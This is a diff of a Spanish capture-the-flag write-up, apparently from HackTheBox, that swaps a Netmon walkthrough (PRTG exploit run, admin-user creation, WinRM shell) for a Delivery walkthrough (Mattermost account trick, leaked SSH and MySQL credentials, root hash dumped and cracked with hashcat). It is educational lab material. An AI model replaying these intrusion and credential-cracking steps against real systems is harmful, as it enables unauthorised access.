@@ -2,7 +2,7 @@
 title: Delivery | Linux
 published: 2025-08-20
 image: "./logo.png"
-tags: [Easy, Linux, ]
+tags: [Easy, Linux, VHOST Enum, MetterMost, Information Leakage, Database Enum, MySQL, Cracking hashes, Hashcat, eJPT, eWPT]
 category: HackTheBox
 ---
 
@@ -183,267 +183,221 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Whatweb
 
-```bash wrap=false
-❯ whatweb http://10.10.10.152
-http://10.10.10.152 [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]
-ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
-```
-
-### PRTG Network Monitor
-
-![PRTG Netowrk Monitor](./1.png)
-
-Vemos que este servicio está corriendo en la versión: `PRTG Network Monitor 18.1.37.13946`.
-
-### Searchsploit
+Usaremos **whatweb** para ver las tecnologías que se están usando:
 
 ```bash wrap=false
-❯ searchsploit PRTG Network Monitor
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                  | windows/webapps/46527.sh
-PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                 | windows/webapps/49156.txt
-PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                              | windows_x86/dos/44500.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+❯ whatweb http://10.10.10.222
+http://10.10.10.222 [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]
+❯ whatweb http://10.10.10.222:8065
+http://10.10.10.222:8065 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]
 ```
 
-Vemos un `RCE` pero necesitamos de `autenticación`.
+### Puerto 80
 
-### FTP
+![Añadir dominios](./1.png)
 
-El puerto **21** que corresponde a **File Transfer Protocol** (`FTP`), está habilitado el lógin anónimo, vamos a ver que encontramos:
+Podemos ver que se usan dominios y `Virtual Hosting`, vamos a añadirlo al `/etc/hosts`.
+
+### helpdesk.delivery.htb
+
+![Main page](./2.png)
+
+Si creamos un nuevo ticket nos dará una correo que podremos usar en el puerto `8065`:
+
+![Creamos un ticket](./3.png)
+
+Al crearnos una cuenta nos enviará una verificación:
+
+![Email verification](./4.png)
+
+Si vamos a la parte para ver nuestros tickets y ponemos la ID incial que nos había dado, vemos el enlace de verificación:
+
+![Email verification URL](./5.png)
+
+### Mattermost
+
+Una vez entremos podremos ver la siguiente conversación:
+
+![Conversación](./6.png)
+
+Por lo cual tendremos las siguientes credenciales `maildeliverer:Youve_G0t_Mail!` y obtendríamos la user flag:
+
+```bash wrap=false title="SSH Login"
+❯ ssh maildeliverer@10.10.10.222
+maildeliverer@10.10.10.222's password: 
+Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
+maildeliverer@Delivery:~$ ls
+user.txt
+maildeliverer@Delivery:~$ cat user.txt 
+172aa93ef51449527e...
+```
+
+## Escalada de privilegios
+
+Dentro del directorio `/opt/mattermost/config` podemos ver que en el `config.json` lo siguiente:
+
+```json wrap=false
+"SqlSettings": {
+  "DriverName": "mysql",
+  "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+  "DataSourceReplicas": [],
+  "DataSourceSearchReplicas": [],
+  "MaxIdleConns": 20,
+  "ConnMaxLifetimeMilliseconds": 3600000,
+  "MaxOpenConns": 300,
+  "Trace": false,
+  "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+  "QueryTimeout": 30,
+  "DisableDatabaseSearch": false
+}
+```
+
+Estas credenciales son válidas para **MySQL**:
+
+```bash wrap=false title="MySQL Login"
+maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 104
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
 
 ```bash wrap=false
-❯ ftp anonymous@10.10.10.152
-Connected to 10.10.10.152.
-220 Microsoft FTP Service
-331 Anonymous access allowed, send identity (e-mail name) as password.
-Password: 230 User logged in.
-Remote system type is Windows_NT.
-ftp> ls
-229 Entering Extended Passive Mode (|||58535|)
-150 Opening ASCII mode data connection.
-02-03-19  12:18AM                 1024 .rnd
-02-25-19  10:15PM       <DIR>          inetpub
-07-16-16  09:18AM       <DIR>          PerfLogs
-02-25-19  10:56PM       <DIR>          Program Files
-02-03-19  12:28AM       <DIR>          Program Files (x86)
-02-03-19  08:08AM       <DIR>          Users
-11-10-23  10:20AM       <DIR>          Windows
-226 Transfer complete.
-ftp> 
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mattermost         |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [(none)]> use mattermost
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mattermost]> show tables;
++------------------------+
+| Tables_in_mattermost   |
++------------------------+
+| Audits                 |
+| Bots                   |
+| ChannelMemberHistory   |
+| ChannelMembers         |
+| Channels               |
+| ClusterDiscovery       |
+| CommandWebhooks        |
+| Commands               |
+| Compliances            |
+| Emoji                  |
+| FileInfo               |
+| GroupChannels          |
+| GroupMembers           |
+| GroupTeams             |
+| IncomingWebhooks       |
+| Jobs                   |
+| Licenses               |
+| LinkMetadata           |
+| OAuthAccessData        |
+| OAuthApps              |
+| OAuthAuthData          |
+| OutgoingWebhooks       |
+| PluginKeyValueStore    |
+| Posts                  |
+| Preferences            |
+| ProductNoticeViewState |
+| PublicChannels         |
+| Reactions              |
+| Roles                  |
+| Schemes                |
+| Sessions               |
+| SidebarCategories      |
+| SidebarChannels        |
+| Status                 |
+| Systems                |
+| TeamMembers            |
+| Teams                  |
+| TermsOfService         |
+| ThreadMemberships      |
+| Threads                |
+| Tokens                 |
+| UploadSessions         |
+| UserAccessTokens       |
+| UserGroups             |
+| UserTermsOfService     |
+| Users                  |
++------------------------+
+46 rows in set (0.001 sec)
+
+MariaDB [mattermost]> select Password from Users where Username = 'root';
++--------------------------------------------------------------+
+| Password                                                     |
++--------------------------------------------------------------+
+| $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
++--------------------------------------------------------------+
+1 row in set (0.000 sec)
 ```
 
-Aquí lo ideal sería buscar el archivo de configuración de este servicio para encontrar las credenciales de este servicio. Pero después de buscar solo encontramos la user flag
+Con esto podremos obtener el **hash** del usuario `root`. En la conversación se mencionaba que la contraseña se podía romper con reglas de hashcat.
+
+```txt title="password"
+PleaseSubscribe!
+```
+
+```txt title="hash"
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+```
+
+Y usaremos `hashcat` para crackearlo:
 
 ```bash wrap=false
-❯ cat user.txt
-40d1ce8bb6b274051bf...
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
+Time.Started.....: Sat Sep 20 14:22:59 2025 (2 secs)
+Time.Estimated...: Sat Sep 20 14:23:01 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (password)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       15 H/s (1.55ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 21/77 (27.27%)
+Rejected.........: 0/21 (0.00%)
+Restore.Point....: 0/1 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
+Hardware.Mon.#1..: Temp: 65c Util: 27%
 ```
 
-### PRTG Configuration Archive
-
-Si usamos `ls -a` para ver archivos/directorios ocultos vemos lo siguiente:
+Y ahí estaría:
 
 ```bash wrap=false
-ftp> ls -a
-229 Entering Extended Passive Mode (|||59450|)
-125 Data connection already open; Transfer starting.
-11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
-02-03-19  12:18AM                 1024 .rnd
-11-20-16  09:59PM               389408 bootmgr
-07-16-16  09:10AM                    1 BOOTNXT
-02-03-19  08:05AM       <DIR>          Documents and Settings
-02-25-19  10:15PM       <DIR>          inetpub
-09-19-25  05:02PM            738197504 pagefile.sys
-07-16-16  09:18AM       <DIR>          PerfLogs
-02-25-19  10:56PM       <DIR>          Program Files
-02-03-19  12:28AM       <DIR>          Program Files (x86)
-12-15-21  10:40AM       <DIR>          ProgramData
-02-03-19  08:05AM       <DIR>          Recovery
-02-03-19  08:04AM       <DIR>          System Volume Information
-02-03-19  08:08AM       <DIR>          Users
-11-10-23  10:20AM       <DIR>          Windows
-226 Transfer complete.
-ftp> 
+maildeliverer@Delivery:/opt/mattermost/config$ su root
+Password: 
+root@Delivery:/opt/mattermost/config# whoami
+root
+root@Delivery:/opt/mattermost/config# cat /root/root.txt 
+626bcfbba4486a5b8398c8861cf9f055
 ```
 
-Si nos metemos en `ProgramData`:
-
-```bash wrap=false
-ftp> cd ProgramData
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||59582|)
-150 Opening ASCII mode data connection.
-12-15-21  10:40AM       <DIR>          Corefig
-02-03-19  12:15AM       <DIR>          Licenses
-11-20-16  10:36PM       <DIR>          Microsoft
-02-03-19  12:18AM       <DIR>          Paessler
-02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
-07-16-16  09:18AM       <DIR>          SoftwareDistribution
-02-03-19  12:15AM       <DIR>          TEMP
-11-20-16  10:19PM       <DIR>          USOPrivate
-11-20-16  10:19PM       <DIR>          USOShared
-02-25-19  10:56PM       <DIR>          VMware
-226 Transfer complete.
-ftp> cd Paessler
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||59584|)
-125 Data connection already open; Transfer starting.
-09-20-25  04:14AM       <DIR>          PRTG Network Monitor
-226 Transfer complete.
-ftp> cd PRTG\ Network\ Monitor
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||59586|)
-125 Data connection already open; Transfer starting.
-09-19-25  05:44PM       <DIR>          Configuration Auto-Backups
-09-19-25  08:00PM       <DIR>          Log Database
-02-03-19  12:18AM       <DIR>          Logs (Debug)
-02-03-19  12:18AM       <DIR>          Logs (Sensors)
-02-03-19  12:18AM       <DIR>          Logs (System)
-09-20-25  12:00AM       <DIR>          Logs (Web Server)
-09-19-25  08:00PM       <DIR>          Monitoring Database
-02-25-19  10:54PM              1189697 PRTG Configuration.dat
-02-25-19  10:54PM              1189697 PRTG Configuration.old
-07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
-09-20-25  04:14AM              1719982 PRTG Graph Data Cache.dat
-02-25-19  11:00PM       <DIR>          Report PDFs
-02-03-19  12:18AM       <DIR>          System Information Database
-02-03-19  12:40AM       <DIR>          Ticket Database
-02-03-19  12:18AM       <DIR>          ToDo Database
-226 Transfer complete.
-ftp> 
-```
-
-La clave está en el archivo `PRTG Configuration.old.bak` en donde encontraremos lo siguiente:
-
-```xml wrap=false title="PRTG Configuration.old.bak"
-<dbpassword>
-  <!-- User: prtgadmin -->
-  PrTg@dmin2018
-</dbpassword>
-```
-
-Pero si nos intentamos loguear no nos deja. Si nos fijamos el año de la contraseña es **2018** y la máquina es de **2019**, si probamos a cambiar eso:
-
-![PRTG Login Successful](./2.png)
-
-## Explotación
- 
-Si ahora usamos el **exploit** que encontramos antes nos creará un usuario con privilegios de **administrador**:
-
-```bash wrap=false
-❯ ./rce.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0NDNUMxMTJCLTU4NzEtNDMxRC05MTVELTQ0RjczMEI0RDMzQn0%3D; Path=/; HttpOnly"
-
-[+]#########################################################################[+] 
-[*] Authenticated PRTG network Monitor remote code execution                [*] 
-[+]#########################################################################[+] 
-[*] Date: 11/03/2019                                                        [*] 
-[+]#########################################################################[+] 
-[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
-[+]#########################################################################[+] 
-[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
-[*] Version: 18.2.38                                                        [*] 
-[*] CVE: CVE-2018-9276                                                      [*] 
-[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
-[+]#########################################################################[+] 
-
-# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
-# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 
-
-[+]#########################################################################[+] 
-
- [*] file created 
- [*] sending notification wait....
-
- [*] adding a new user 'pentest' with password 'P3nT3st' 
- [*] sending notification wait....
-
- [*] adding a user pentest to the administrators group 
- [*] sending notification wait....
-
-
- [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
-```
-
-Vamos a comprobarlo:
-
-```bash wrap=false
-❯ crackmapexec winrm 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
-SMB         10.10.10.152    5985   NETMON           [*] Windows 10 / Server 2016 Build 14393 (name:NETMON) (domain:netmon)
-HTTP        10.10.10.152    5985   NETMON           [*] http://10.10.10.152:5985/wsman
-/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
-  arc4 = algorithms.ARC4(self._key)
-WINRM       10.10.10.152    5985   NETMON           [+] netmon\pentest:P3nT3st! (Pwn3d!)
-❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
-                                        
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\pentest\Documents> whoami
-netmon\pentest
-*Evil-WinRM* PS C:\Users\pentest\Documents> cd ..
-*Evil-WinRM* PS C:\Users\pentest> cd ..
-*Evil-WinRM* PS C:\Users> dir
-
-
-    Directory: C:\Users
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        2/25/2019  10:44 PM                Administrator
-d-----        9/20/2025   4:48 AM                pentest
-d-r---        9/20/2025   4:46 AM                Public
-
-
-*Evil-WinRM* PS C:\Users> cd Administrator
-*Evil-WinRM* PS C:\Users\Administrator> dir
-
-
-    Directory: C:\Users\Administrator
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-r---         2/3/2019   7:08 AM                Contacts
-d-r---         2/2/2019  11:35 PM                Desktop
-d-r---         2/3/2019   7:08 AM                Documents
-d-r---         2/3/2019   7:08 AM                Downloads
-d-r---         2/3/2019   7:08 AM                Favorites
-d-r---         2/3/2019   7:08 AM                Links
-d-r---         2/3/2019   7:08 AM                Music
-d-r---         2/3/2019   7:08 AM                Pictures
-d-r---         2/3/2019   7:08 AM                Saved Games
-d-r---         2/3/2019   7:08 AM                Searches
-d-r---        2/25/2019  10:06 PM                Videos
-
-
-*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
-
-
-    Directory: C:\Users\Administrator\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        9/19/2025   5:03 PM             34 root.txt
-
-
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-b008c657ce1821d3b...
-```
-
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/177)
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/308)
 
 ---
